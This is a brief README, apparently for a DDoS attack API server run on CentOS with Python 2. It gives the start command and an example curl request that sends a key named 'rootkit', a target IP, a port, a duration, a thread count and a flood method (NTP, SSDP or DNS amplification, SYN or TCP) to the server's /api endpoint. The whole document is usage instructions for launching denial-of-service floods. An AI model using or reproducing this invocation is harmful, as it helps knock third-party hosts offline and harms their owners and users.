命令执行接口调用

### Env
* Centos 6/7
* Python 2.6/2.7+

### Run
```
# /opt/DDoSApi/RunServer
```

### Call Api Example
```
# curl -sd "key=rootkit&host=[IP]&port=[PORT]&time=[time/sec]&thread=[threads]&method=[ntp|ssdp|dns|syn|tcp]" http://ServerIp:Port/api
```
